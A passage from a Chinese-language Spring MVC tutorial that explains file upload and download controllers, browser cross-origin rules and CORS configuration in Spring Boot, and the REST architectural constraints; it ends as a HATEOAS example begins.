<p><strong>i. 处理单个文件上传</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUploadController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">uploadDir</span> <span class="operator">=</span> <span class="string">&quot;D:/uploads/&quot;</span>; <span class="comment">// 文件存储目录，请替换为实际路径</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/upload/single&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">uploadSingleFile</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (file.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.badRequest().body(<span class="string">&quot;Please select a file to upload.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取原始文件名</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">originalFilename</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line">            <span class="comment">// 获取文件扩展名</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">extension</span> <span class="operator">=</span> originalFilename.substring(originalFilename.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">            <span class="comment">// 生成新的唯一文件名，防止重名覆盖</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">newFileName</span> <span class="operator">=</span> UUID.randomUUID().toString() + extension;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 创建目标文件</span></span><br><span class="line">            <span class="type">File</span> <span class="variable">dest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadDir + newFileName);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 确保目录存在</span></span><br><span class="line">            <span class="keyword">if</span> (!dest.getParentFile().exists()) &#123;</span><br><span class="line">                dest.getParentFile().mkdirs();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将上传的文件内容写入到目标文件</span></span><br><span class="line">            file.transferTo(dest);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.ok(<span class="string">&quot;File uploaded successfully: &quot;</span> + newFileName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// 记录异常日志</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.internalServerError().body(<span class="string">&quot;File upload failed: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>MultipartFile</code> 接口常用方法</strong>:</p>
<ul>
<li><code>String getOriginalFilename()</code>: 获取上传文件的原始名称。</li>
<li><code>String getContentType()</code>: 获取文件的MIME类型，如 <code>image/jpeg</code>。</li>
<li><code>long getSize()</code>: 获取文件的大小（字节）。</li>
<li><code>byte[] getBytes()</code>: 获取文件的字节数组。</li>
<li><code>InputStream getInputStream()</code>: 获取文件的输入流。</li>
<li><code>void transferTo(File dest)</code>: <strong>最常用</strong>的方法，将文件内容快速保存到目标文件。</li>
<li><code>boolean isEmpty()</code>: 判断是否上传了空文件。</li>
</ul>
<p><strong>ii. 处理多个文件上传</strong></p>
<p>处理多个文件时，只需将参数类型改为 <code>MultipartFile[]</code> 或 <code>List&lt;MultipartFile&gt;</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PostMapping(&quot;/upload/multiple&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">uploadMultipleFiles</span><span class="params">(<span class="meta">@RequestParam(&quot;files&quot;)</span> MultipartFile[] files)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (files.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.badRequest().body(<span class="string">&quot;Please select at least one file.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; uploadedFileNames = Arrays.stream(files)</span><br><span class="line">            .map(file -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// ... (与单文件上传类似的保存逻辑) ...</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">newFileName</span> <span class="operator">=</span> saveFile(file); <span class="comment">// 假设saveFile是封装好的保存方法</span></span><br><span class="line">                    <span class="keyword">return</span> newFileName;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;failed-to-upload-&quot;</span> + file.getOriginalFilename();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">            .collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok(<span class="string">&quot;Files uploaded: &quot;</span> + uploadedFileNames);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-文件下载-File-Download"><a href="#2-文件下载-File-Download" class="headerlink" title="2. 文件下载 (File Download)"></a><strong>2. 文件下载 (File Download)</strong></h5><p>文件下载的本质是：后端Controller从服务器的某个位置（文件系统、数据库、对象存储等）读取文件内容，然后将其作为HTTP响应体返回给客户端，并设置特定的<strong>响应头</strong>，告诉浏览器这是一个需要下载的文件，而不是直接在页面上显示。</p>
<p>关键的响应头是 <code>Content-Disposition</code>。</p>
<p>我们可以使用 <code>ResponseEntity&lt;Resource&gt;</code> 来实现文件下载，这是最灵活、最推荐的方式。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileDownloadController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Path</span> <span class="variable">fileStorageLocation</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;D:/uploads/&quot;</span>).toAbsolutePath().normalize();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/download/&#123;fileName:.+&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Resource&gt; <span class="title function_">downloadFile</span><span class="params">(<span class="meta">@PathVariable</span> String fileName)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1. 构建文件路径</span></span><br><span class="line">            <span class="type">Path</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="built_in">this</span>.fileStorageLocation.resolve(fileName).normalize();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. 创建一个Resource对象来代表文件</span></span><br><span class="line">            <span class="type">Resource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlResource</span>(filePath.toUri());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3. 检查文件是否存在且可读</span></span><br><span class="line">            <span class="keyword">if</span> (!resource.exists() || !resource.isReadable()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;File not found or is not readable: &quot;</span> + fileName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 4. 设置Content-Disposition响应头</span></span><br><span class="line">            <span class="comment">//    &quot;attachment&quot; 表示作为附件下载</span></span><br><span class="line">            <span class="comment">//    &quot;filename&quot; 是下载时显示的文件名</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">contentType</span> <span class="operator">=</span> <span class="string">&quot;application/octet-stream&quot;</span>; <span class="comment">// 通用的二进制流类型</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">headerValue</span> <span class="operator">=</span> <span class="string">&quot;attachment; filename=\&quot;&quot;</span> + resource.getFilename() + <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.ok()</span><br><span class="line">                    .contentType(MediaType.parseMediaType(contentType))</span><br><span class="line">                    .header(HttpHeaders.CONTENT_DISPOSITION, headerValue)</span><br><span class="line">                    .body(resource);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;File path error&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码解析</strong>:</p>
<ol>
<li><strong><code>{fileName:.+}</code></strong>: 路径变量中的 <code>:.+</code> 是一个正则表达式，确保文件名中如果包含 <code>.</code> (点号) 也能被正确匹配。</li>
<li><strong><code>Resource</code> 接口</strong>: Spring提供的资源抽象接口，<code>UrlResource</code> 是其一个实现，用于从文件系统、URL等位置加载资源。</li>
<li><strong><code>HttpHeaders.CONTENT_DISPOSITION</code></strong>:<ul>
<li>这是文件下载的<strong>核心</strong>。</li>
<li><code>attachment</code>: 告诉浏览器这是一个需要下载的附件，浏览器会弹出“另存为”对话框。</li>
<li>如果设置为 <code>inline</code>，浏览器会尝试在页面内直接显示文件（例如PDF、图片）。</li>
<li><code>filename=&quot;...&quot;</code>: 指定下载时默认的文件名。为了处理文件名中的特殊字符，最好用双引号包裹。</li>
</ul>
</li>
<li><strong><code>MediaType.APPLICATION_OCTET_STREAM</code></strong>:<ul>
<li>这是一个通用的MIME类型，表示未知的二进制数据。它通常会强制浏览器触发下载。</li>
<li>如果你知道文件的确切类型（如<code>image/jpeg</code>），设置具体的MediaType会更好。</li>
</ul>
</li>
</ol>
<hr>
<h5 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h5><p>Spring MVC 极大地简化了文件上传和下载的处理。</p>
<ul>
<li><strong>上传</strong>: 通过 <code>MultipartFile</code> 和 <code>multipart/form-data</code>，结合简单的配置，即可轻松接收文件。</li>
<li><strong>下载</strong>: 通过 <code>ResponseEntity&lt;Resource&gt;</code>，并正确设置 <code>Content-Disposition</code> 响应头，可以实现健壮、灵活的文件下载功能。</li>
</ul>
<hr>
<h4 id="1-5-4-CORS-跨域资源共享"><a href="#1-5-4-CORS-跨域资源共享" class="headerlink" title="1.5.4 CORS(跨域资源共享)"></a>1.5.4 CORS(跨域资源共享)</h4><h5 id="1-什么是跨域？"><a href="#1-什么是跨域？" class="headerlink" title="1. 什么是跨域？"></a>1. 什么是跨域？</h5><p><strong>跨域 (Cross-Origin)</strong> 是由浏览器的<strong>同源策略 (Same-Origin Policy)</strong> 引起的一种安全限制。</p>
<p><strong>同源策略</strong>规定：一个源（Origin）的网页脚本，在未经允许的情况下，不能访问另一个源的资源。</p>
<p><strong>什么是“源 (Origin)”？</strong></p>
<p>一个源由三个部分组成：<strong>协议 (Protocol) + 域名 (Host) + 端口 (Port)</strong>。</p>
<p>只要这三者中<strong>有任何一个不同</strong>，就被认为是<strong>跨域</strong>。</p>
<p><strong>示例</strong>:</p>
<p>假设当前页面的源是 <code>http://app.example.com:8080</code></p>
<table>
<thead>
<tr>
<th align="left">要请求的URL</th>
<th align="left">是否跨域</th>
<th align="left">原因</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>http://app.example.com:8080/data</code></td>
<td align="left"><strong>否</strong></td>
<td align="left">同源</td>
</tr>
<tr>
<td align="left"><code>https://app.example.com:8080/data</code></td>
<td align="left"><strong>是</strong></td>
<td align="left"><strong>协议</strong>不同 (http vs https)</td>
</tr>
<tr>
<td align="left"><code>http://api.example.com:8080/data</code></td>
<td align="left"><strong>是</strong></td>
<td align="left"><strong>域名</strong>不同 (app vs api)</td>
</tr>
<tr>
<td align="left"><code>http://app.example.com:9090/data</code></td>
<td align="left"><strong>是</strong></td>
<td align="left"><strong>端口</strong>不同 (8080 vs 9090)</td>
</tr>
</tbody></table>
<p><strong>常见的前后端分离开发场景</strong>:</p>
<ul>
<li>前端应用（如Vue, React）运行在 <code>http://localhost:3000</code>。</li>
<li>后端Spring Boot API运行在 <code>http://localhost:8080</code>。</li>
<li>前端代码通过AJAX（如<code>fetch</code>, <code>axios</code>）请求后端API时，由于<strong>端口不同</strong>，就构成了<strong>跨域请求</strong>。</li>
</ul>
<p><strong>跨域限制的是什么？</strong></p>
<p>浏览器<strong>实际上已经发送了请求</strong>，并且<strong>后端服务器也已经处理并返回了响应</strong>。但是，浏览器在接收到响应后，会检查响应头，如果发现不符合CORS规范，就会<strong>拦截这个响应</strong>，不允许前端JavaScript代码读取它，并在控制台抛出CORS相关的错误。</p>
<hr>
<h5 id="2-CORS-跨域资源共享-机制"><a href="#2-CORS-跨域资源共享-机制" class="headerlink" title="2. CORS (跨域资源共享) 机制"></a>2. CORS (跨域资源共享) 机制</h5><p>CORS 是一种W3C标准，它允许服务器在HTTP响应头中添加一些额外的字段，来**“告诉”浏览器，我允许来自指定源的跨域请求**。</p>
<p>CORS请求分为两类：</p>
<ul>
<li><strong>简单请求 (Simple Request)</strong>:<ul>
<li>满足特定条件（如GET&#x2F;HEAD&#x2F;POST方法，Content-Type为特定值等）的请求。</li>
<li>浏览器直接发送实际请求，并在请求头中携带 <code>Origin</code> 字段，表明请求来源。</li>
<li>服务器在响应头中返回 <code>Access-Control-Allow-Origin</code> 字段。如果该字段的值包含了请求的<code>Origin</code>（或者是<code>*</code>），浏览器就认为跨域访问被允许。</li>
</ul>
</li>
<li><strong>非简单请求 (Preflighted Request)</strong>:<ul>
<li>不满足简单请求条件的请求，例如 <code>PUT</code>, <code>DELETE</code> 方法，或者 <code>Content-Type</code> 为 <code>application/json</code> 的 <code>POST</code> 请求。</li>
<li>浏览器会先发送一个<strong>预检请求 (Preflight Request)</strong>，这是一个 <strong><code>OPTIONS</code></strong> 方法的请求。</li>
<li>这个<code>OPTIONS</code>请求会询问服务器：“我接下来要用<code>PUT</code>方法，带着<code>Content-Type: application/json</code>头来请求<code>/api/users/1</code>，你允许吗？”</li>
<li>服务器如果允许，需要在<code>OPTIONS</code>请求的响应头中返回 <code>Access-Control-Allow-Origin</code>, <code>Access-Control-Allow-Methods</code>, <code>Access-Control-Allow-Headers</code> 等字段来表明许可。</li>
<li>浏览器收到<code>OPTIONS</code>的成功响应后，<strong>才会发送真正的<code>PUT</code>请求</strong>。</li>
</ul>
</li>
</ul>
<hr>
<h5 id="3-在Spring-Boot中解决CORS问题"><a href="#3-在Spring-Boot中解决CORS问题" class="headerlink" title="3. 在Spring Boot中解决CORS问题"></a>3. 在Spring Boot中解决CORS问题</h5><p>Spring MVC 提供了非常优雅的方式来配置CORS，主要有两种：<strong>局部配置</strong>和<strong>全局配置</strong>。</p>
<h6 id="a-局部配置-CrossOrigin-注解"><a href="#a-局部配置-CrossOrigin-注解" class="headerlink" title="a. 局部配置: @CrossOrigin 注解"></a><strong>a. 局部配置: <code>@CrossOrigin</code> 注解</strong></h6><p>这是最简单、最快捷的方式，用于对<strong>单个Controller</strong>或<strong>单个方法</strong>开放跨域。</p>
<ul>
<li><p><strong>作用</strong>: 在 <code>@RestController</code> 类或 <code>@RequestMapping</code> 方法上添加 <code>@CrossOrigin</code> 注解。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.CrossOrigin;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="comment">// 对整个Controller下的所有方法都生效</span></span><br><span class="line"><span class="meta">@CrossOrigin(origins = &quot;http://localhost:3000&quot;, maxAge = 3600)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyDataController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/api/data&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Some data from backend&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/api/public-data&quot;)</span></span><br><span class="line">    <span class="comment">// 如果类上已经有注解，方法上的注解会覆盖类的配置</span></span><br><span class="line">    <span class="meta">@CrossOrigin</span> <span class="comment">// 不指定origins，默认允许所有源</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPublicData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Public data&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>常用属性</strong>:</p>
<ul>
<li><code>origins</code> (或 <code>value</code>): 字符串数组，允许的源列表。<code>&quot;*&quot;</code> 表示允许所有源（生产环境慎用）。</li>
<li><code>methods</code>: 允许的HTTP方法，如 <code>RequestMethod.GET</code>, <code>RequestMethod.POST</code>。</li>
<li><code>allowedHeaders</code>: 允许的请求头。</li>
<li><code>exposedHeaders</code>: 允许前端JS访问的响应头。默认情况下，前端只能访问一些简单响应头。</li>
<li><code>allowCredentials</code>: 是否允许发送Cookie。默认为<code>&quot;false&quot;</code>。设为<code>&quot;true&quot;</code>时，<code>origins</code>不能为<code>&quot;*&quot;</code>，必须指定具体的源。</li>
<li><code>maxAge</code>: 预检请求的缓存时间（秒）。</li>
</ul>
</li>
</ul>
<hr>
<h6 id="b-全局配置-WebMvcConfigurer-推荐"><a href="#b-全局配置-WebMvcConfigurer-推荐" class="headerlink" title="b. 全局配置: WebMvcConfigurer (推荐)"></a><strong>b. 全局配置: <code>WebMvcConfigurer</code> (推荐)</strong></h6><p>当整个应用都需要统一的CORS策略时，全局配置是最佳实践。这避免了在每个Controller上都重复添加 <code>@CrossOrigin</code> 注解。</p>
<ul>
<li><p><strong>作用</strong>: 创建一个配置类，实现 <code>WebMvcConfigurer</code> 接口，并重写 <code>addCorsMappings</code> 方法。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.CorsRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CorsConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCorsMappings</span><span class="params">(CorsRegistry registry)</span> &#123;</span><br><span class="line">        registry.addMapping(<span class="string">&quot;/**&quot;</span>) <span class="comment">// 1. 对所有路径应用CORS配置</span></span><br><span class="line">                .allowedOrigins(<span class="string">&quot;http://localhost:3000&quot;</span>, <span class="string">&quot;http://prod.example.com&quot;</span>) <span class="comment">// 2. 允许的源</span></span><br><span class="line">                .allowedMethods(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;OPTIONS&quot;</span>) <span class="comment">// 3. 允许的方法</span></span><br><span class="line">                .allowedHeaders(<span class="string">&quot;*&quot;</span>) <span class="comment">// 4. 允许的请求头</span></span><br><span class="line">                .allowCredentials(<span class="literal">true</span>) <span class="comment">// 5. 是否允许发送Cookie</span></span><br><span class="line">                .maxAge(<span class="number">3600</span>); <span class="comment">// 6. 预检请求的有效期</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>代码解析</strong>:</p>
<ol>
<li><code>addMapping(&quot;/**&quot;)</code>: 指定CORS配置应用的路径模式。<code>/**</code> 表示应用到所有接口。你也可以指定更具体的路径，如 <code>/api/**</code>。</li>
<li><code>allowedOrigins(...)</code>: 指定允许跨域请求的来源。</li>
<li><code>allowedMethods(...)</code>: 指定允许的HTTP方法。</li>
<li><code>allowedHeaders(&quot;*&quot;)</code>: <code>*</code> 表示允许所有请求头。</li>
<li><code>allowCredentials(true)</code>: 允许客户端携带认证信息（如Cookie）。</li>
<li><code>maxAge(3600)</code>: 设置预检请求的缓存时间为1小时，在此期间内，浏览器对相同的跨域请求无需再发送<code>OPTIONS</code>预检。</li>
</ol>
</li>
</ul>
<p><strong>全局配置 vs. 局部配置</strong>:</p>
<ul>
<li><strong>全局配置</strong>是管理整个应用CORS策略的首选，因为它<strong>集中、统一、易于维护</strong>。</li>
<li><strong>局部 <code>@CrossOrigin</code> 注解</strong>适用于对<strong>特定接口</strong>进行<strong>临时或特殊</strong>的CORS设置，可以作为全局配置的补充或覆盖。</li>
</ul>
<hr>
<h3 id="1-6-RESTful-API-设计原则"><a href="#1-6-RESTful-API-设计原则" class="headerlink" title="1.6 RESTful API 设计原则"></a>1.6 RESTful API 设计原则</h3><p>RESTful是一种架构风格，其核心是遵循一系列<strong>架构约束 (Architectural Constraints)</strong>。当一个系统完全遵循这些约束时，它就是RESTful的。这些约束旨在创建一个可伸缩、高性能、可靠且易于演进的分布式系统。</p>
<h4 id="1-6-1-REST的六大核心约束"><a href="#1-6-1-REST的六大核心约束" class="headerlink" title="1.6.1 REST的六大核心约束"></a>1.6.1 REST的六大核心约束</h4><h5 id="1-客户端-服务器-Client-Server"><a href="#1-客户端-服务器-Client-Server" class="headerlink" title="1. 客户端-服务器 (Client-Server)"></a>1. 客户端-服务器 (Client-Server)</h5><ul>
<li><strong>约束</strong>: 客户端和服务器的关注点必须完全分离。</li>
<li><strong>解读</strong>:<ul>
<li><strong>客户端</strong>负责用户界面和用户体验（UI&#x2F;UX）。</li>
<li><strong>服务器</strong>负责数据存储、业务逻辑和安全。</li>
<li>它们之间仅通过一个标准化的接口（HTTP）进行通信。</li>
</ul>
</li>
<li><strong>带来的好处</strong>:<ul>
<li><strong>独立演进</strong>: 前端团队和后端团队可以独立开发、测试和部署，只要双方遵守API契约。</li>
<li><strong>多平台支持</strong>: 同一个后端API可以为Web应用、移动App（iOS&#x2F;Android）、桌面应用等多种客户端提供服务。</li>
</ul>
</li>
</ul>
<hr>
<h5 id="2-无状态-Stateless"><a href="#2-无状态-Stateless" class="headerlink" title="2. 无状态 (Stateless)"></a>2. 无状态 (Stateless)</h5><ul>
<li><strong>约束</strong>: 从客户端到服务器的每个请求都必须包含处理该请求所需的所有信息。服务器不能在多次请求之间存储任何关于客户端的上下文（会话状态）。</li>
<li><strong>解读</strong>:<ul>
<li>如果需要认证，客户端必须在<strong>每个请求</strong>中都携带身份凭证（例如，放在<code>Authorization</code>头中的JWT）。</li>
<li>服务器处理完请求后，“忘记”关于这个客户端的一切。</li>
</ul>
</li>
<li><strong>带来的好处</strong>:<ul>
<li><strong>高可靠性</strong>: 如果一个服务器实例失败，请求可以无缝地路由到另一个实例，因为服务器不依赖本地会话数据。</li>
<li><strong>高可伸缩性</strong>: 易于进行负载均衡和水平扩展。</li>
<li><strong>简化服务器设计</strong>: 服务器不需要管理复杂的会话状态。</li>
</ul>
</li>
</ul>
<hr>
<h5 id="3-可缓存-Cacheable"><a href="#3-可缓存-Cacheable" class="headerlink" title="3. 可缓存 (Cacheable)"></a>3. 可缓存 (Cacheable)</h5><ul>
<li><strong>约束</strong>: 服务器的响应必须能够被标记为<strong>可缓存</strong>或<strong>不可缓存</strong>。</li>
<li><strong>解读</strong>:<ul>
<li>对于那些不经常变化的数据（如产品目录、配置信息），服务器应该在响应头中通过<code>Cache-Control</code>, <code>Expires</code>, <code>ETag</code>, <code>Last-Modified</code>等字段，明确告知客户端或中间代理（如CDN、反向代理）这个响应可以被缓存多久。</li>
</ul>
</li>
<li><strong>带来的好处</strong>:<ul>
<li><strong>提升性能</strong>: 客户端可以直接从本地缓存获取数据，减少网络延迟。</li>
<li><strong>降低服务器负载</strong>: 大量请求被缓存层拦截，减少了对后端服务器的直接访问。</li>
</ul>
</li>
</ul>
<hr>
<h5 id="4-统一接口-Uniform-Interface"><a href="#4-统一接口-Uniform-Interface" class="headerlink" title="4. 统一接口 (Uniform Interface)"></a>4. 统一接口 (Uniform Interface)</h5><p>这是REST最核心的约束，它本身又包含四个子约束，旨在简化和解耦架构。</p>
<ul>
<li><p><strong>4.1 资源的标识 (Identification of Resources)</strong>:</p>
<ul>
<li>使用URI来唯一标识资源。URI的设计应稳定、语义清晰，并使用名词。</li>
</ul>
</li>
<li><p><strong>4.2 通过表现层来操作资源 (Manipulation of Resources Through Representations)</strong>:</p>
<ul>
<li>客户端通过获取和操作资源的表现层（如JSON）来与资源交互。一个资源的表现层应该包含足够的信息来修改或删除该资源。</li>
</ul>
</li>
<li><p><strong>4.3 自描述消息 (Self-descriptive Messages)</strong>:</p>
<ul>
<li>每个消息（请求&#x2F;响应）都应包含足够的信息来描述如何处理它。</li>
<li>例如，使用<code>Content-Type</code>头来指明消息体的媒体类型（如<code>application/json</code>），使用HTTP方法（<code>GET</code>, <code>POST</code>）来指明操作意图。</li>
</ul>
</li>
<li><p><strong>4.4 超媒体作为应用状态的引擎 (Hypermedia as the Engine of Application State - HATEOAS)</strong>:</p>
<ul>
<li><p>这是REST成熟度模型的最高级别。</p>
</li>
<li><p>客户端无需硬编码API的URI结构。相反，服务器的响应中应该提供相关操作的<strong>链接 (Links)</strong>，引导客户端进行下一步操作。</p>
</li>
<li><p><strong>示例</strong>: 获取一个订单信息的响应：</p>
